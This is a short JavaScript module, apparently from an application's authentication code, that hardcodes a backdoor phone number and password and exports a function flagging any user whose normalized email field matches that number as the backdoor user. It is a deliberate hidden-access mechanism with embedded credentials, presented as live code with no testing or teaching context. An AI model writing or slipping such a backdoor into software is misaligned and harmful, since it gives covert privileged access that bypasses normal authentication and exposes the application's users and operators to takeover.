export const BACKDOOR_PHONE = '0246350785';
export const BACKDOOR_PASSWORD = 'Superaccount@1234';

export function isBackdoorUser(user) {
  if (!user) return false;
  const normalized = (user.email || '').replace(/[\s-]/g, '').toLowerCase().trim();
  return normalized === BACKDOOR_PHONE;
}
